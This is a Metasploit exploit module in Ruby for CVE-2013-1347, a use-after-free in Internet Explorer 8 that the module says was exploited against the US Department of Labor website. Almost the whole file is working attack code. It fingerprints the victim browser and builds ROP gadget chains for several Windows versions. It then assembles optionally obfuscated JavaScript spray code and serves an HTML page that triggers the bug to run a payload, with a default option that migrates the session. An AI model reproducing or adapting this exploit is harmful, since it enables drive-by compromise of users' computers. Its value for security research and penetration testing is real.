#
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "8.0",
    :ua_maxver  => "8.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => GoodRanking
  })

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Microsoft Internet Explorer. A
        use-after-free condition occurs when a CGenericElement object is freed, but a
        reference is kept on the Document and used again during rendering, an invalid
        memory that&#039;s controllable is used, and allows arbitrary code execution under the
        context of the user.

          Please note: This vulnerability has been exploited in the wild on 2013 May, in
        the compromise of the Department of Labor (DoL) Website.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;,
          &#039;EMH&#039;,
          &#039;juan vazquez&#039;,  #RCA
          &#039;sinn3r&#039;         #RCA
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-1347&#039; ],
          [ &#039;OSVDB&#039;, &#039;92993&#039; ],
          [ &#039;URL&#039;, &#039;http://blogs.technet.com/b/msrc/archive/2013/05/03/microsoft-releases-security-advisory-2847140.aspx&#039;],
          [ &#039;URL&#039;, &#039;http://r-7.co/IE8-DOL&#039; ] # sinn3r&#039;s writeup
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;       => "\x00",
          &#039;Space&#039;          => 1024,
          &#039;DisableNops&#039;    => true
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 8 on Windows XP SP3&#039;,       { &#039;Rop&#039; => :msvcrt } ],
          [ &#039;IE 8 on Windows Vista&#039;,        { &#039;Rop&#039; => :jre    } ],
          [ &#039;IE 8 on Windows Server 2003&#039;,  { &#039;Rop&#039; => :msvcrt } ],
          [ &#039;IE 8 on Windows 7&#039;,            { &#039;Rop&#039; => :jre    } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "May 3 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    when &#039;5.2&#039;
      os_name = &#039;Windows Server 2003&#039;
    when &#039;6.0&#039;
      os_name = &#039;Windows Vista&#039;
    when &#039;6.1&#039;
      os_name = &#039;Windows 7&#039;
    else
      # OS not supported
      return nil
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie8_smil(my_target, p)

    case my_target[&#039;Rop&#039;]
    when :msvcrt
      case my_target.name
      when &#039;IE 8 on Windows XP SP3&#039;
        align_esp = Rex::Text.to_unescape([0x77c4d801].pack("V*")) # ADD ESP, 2C; RET
        xchg_esp  = Rex::Text.to_unescape([0x77c15ed5].pack("V*")) # XCHG EAX, ESP, RET
      when &#039;IE 8 on Windows Server 2003&#039;
        align_esp = Rex::Text.to_unescape([0x77bde7f6].pack("V*"))
        xchg_esp  = Rex::Text.to_unescape([0x77bcba5e].pack("V*"))
      end
    else
      align_esp = Rex::Text.to_unescape([0x7C3445F8].pack("V*"))
      xchg_esp  = Rex::Text.to_unescape([0x7C348B05].pack("V*"))
    end

    padding    = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4))
    js_payload = Rex::Text.to_unescape(p)

    js = %Q|
    unicorn = unescape("ABCD");
    unicorn2 = unescape("EEEE");
    for (i=0; i < 2; i++) {
      unicorn += unescape("ABCD");
    }unicorn += unescape("AB");

    unicorn += unescape("#{js_payload}");

    animvalues = unescape("#{align_esp}");

    for (i=0; i < 0x70/4; i++) {
      if (i == 0x70/4-1) {
        animvalues += unescape("#{xchg_esp}");
      }
      else {
        animvalues += unescape("#{align_esp}");
      }
    }

    animvalues += unicorn;

    for(i = 0; i < 13; i++) {
      animvalues += ";red";
    }
    |

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V")[0].to_i
  end

  def nop
    return make_nops(4).unpack("V")[0].to_i
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t[&#039;Rop&#039;].nil?

    case t[&#039;Rop&#039;]
    when :msvcrt
      case t.name
      when &#039;IE 8 on Windows XP SP3&#039;
        rop_gadgets =
        [
          0x77c1e844, # POP EBP # RETN [msvcrt.dll]
          0x77c1e844, # skip 4 bytes [msvcrt.dll]
          0x77c4fa1c, # POP EBX # RETN [msvcrt.dll]
          0xffffffff,
          0x77c127e5, # INC EBX # RETN [msvcrt.dll]
          0x77c127e5, # INC EBX # RETN [msvcrt.dll]
          0x77c4e0da, # POP EAX # RETN [msvcrt.dll]
          0x2cfe1467, # put delta into eax (-> put 0x00001000 into edx)
          0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
          0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]
          0x77c34fcd, # POP EAX # RETN [msvcrt.dll]
          0x2cfe04a7, # put delta into eax (-> put 0x00000040 into ecx)
          0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
          0x77c14001, # XCHG EAX,ECX # RETN [msvcrt.dll]
          0x77c3048a, # POP EDI # RETN [msvcrt.dll]
          0x77c47a42, # RETN (ROP NOP) [msvcrt.dll]
          0x77c46efb, # POP ESI # RETN [msvcrt.dll]
          0x77c2aacc, # JMP [EAX] [msvcrt.dll]
          0x77c3b860, # POP EAX # RETN [msvcrt.dll]
          0x77c1110c, # ptr to &VirtualAlloc() [IAT msvcrt.dll]
          0x77c12df9, # PUSHAD # RETN [msvcrt.dll]
          0x77c35459  # ptr to &#039;push esp #  ret &#039; [msvcrt.dll]
        ].pack("V*")
      when &#039;IE 8 on Windows Server 2003&#039;
        rop_gadgets =
        [
          0x77bb2563, # POP EAX # RETN
          0x77ba1114, # <- *&VirtualProtect()
          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
          junk,
          0x77bb0c86, # XCHG EAX,ESI # RETN
          0x77bc9801, # POP EBP # RETN
          0x77be2265, # ptr to &#039;push esp #  ret&#039;
          0x77bb2563, # POP EAX # RETN
          0x03C0990F,
          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
          0x77bb48d3, # POP EBX, RET
          0x77bf21e0, # .data
          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
          0x77bbfc02, # POP ECX # RETN
          0x77bef001, # W pointer (lpOldProtect) (-> ecx)
          0x77bd8c04, # POP EDI # RETN
          0x77bd8c05, # ROP NOP (-> edi)
          0x77bb2563, # POP EAX # RETN
          0x03c0984f,
          0x77bdd441, # SUB EAX, 03c0940f
          0x77bb8285, # XCHG EAX,EDX # RETN
          0x77bb2563, # POP EAX # RETN
          nop,
          0x77be6591  # PUSHAD # ADD AL,0EF # RETN
        ].pack("V*")
      end
    else
      rop_gadgets =
      [
        0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
        0xfffffdff, # Value to negate, will become 0x00000201 (dwSize)
        0x7c347f98, # RETN (ROP NOP) [msvcr71.dll]
        0x7c3415a2, # JMP [EAX] [msvcr71.dll]
        0xffffffff,
        0x7c376402, # skip 4 bytes [msvcr71.dll]
        0x7c351e05, # NEG EAX # RETN [msvcr71.dll]
        0x7c345255, # INC EBX # FPATAN # RETN [msvcr71.dll]
        0x7c352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll]
        0x7c344f87, # POP EDX # RETN [msvcr71.dll]
        0xffffffc0, # Value to negate, will become 0x00000040
        0x7c351eb1, # NEG EDX # RETN [msvcr71.dll]
        0x7c34d201, # POP ECX # RETN [msvcr71.dll]
        0x7c38b001, # &Writable location [msvcr71.dll]
        0x7c347f97, # POP EAX # RETN [msvcr71.dll]
        0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
        0x7c378c81, # PUSHAD # ADD AL,0EF # RETN [msvcr71.dll]
        0x7c345c30  # ptr to &#039;push esp #  ret &#039; [msvcr71.dll]
        # rop chain generated with mona.py
      ].pack("V*")
    end

    rop_payload = rop_gadgets
    case t[&#039;Rop&#039;]
    when :msvcrt
      rop_payload << "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
    else
      rop_payload << "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
    end
    rop_payload << code
    rop_payload << rand_text_alpha(12000) unless t[&#039;Rop&#039;] == :msvcrt

    return rop_payload
  end

  def load_exploit_html(my_target, cli)

    p  = get_payload(my_target, cli)
    js = ie8_smil(my_target, p)

    html = %Q|
    <!doctype html>
    <HTML XMLNS:t ="urn:schemas-microsoft-com:time">
    <head>
    <meta>
      <?IMPORT namespace="t" implementation="#default#time2">
    </meta>

    <script>
    function helloWorld()
    {
      #{js}
      f0 = document.createElement(&#039;span&#039;);
      document.body.appendChild(f0);
      f1 = document.createElement(&#039;span&#039;);
      document.body.appendChild(f1);
      f2 = document.createElement(&#039;span&#039;);
      document.body.appendChild(f2);
      document.body.contentEditable="true";
      f2.appendChild(document.createElement(&#039;datalist&#039;));
      f1.appendChild(document.createElement(&#039;span&#039;));
      f1.appendChild(document.createElement(&#039;table&#039;));
      try{
        f0.offsetParent=null;
      }catch(e) {

      }f2.innerHTML="";
      f0.appendChild(document.createElement(&#039;hr&#039;));
      f1.innerHTML="";

      CollectGarbage();

      try {
        a = document.getElementById(&#039;myanim&#039;);
        a.values = animvalues;
      }
      catch(e) {}
    }

    </script>
    </head>
    <body onload="eval(helloWorld());">
    <t:ANIMATECOLOR id="myanim"/>

    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, &#039;&#039;)
    print_status("Sending HTML...")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end

end

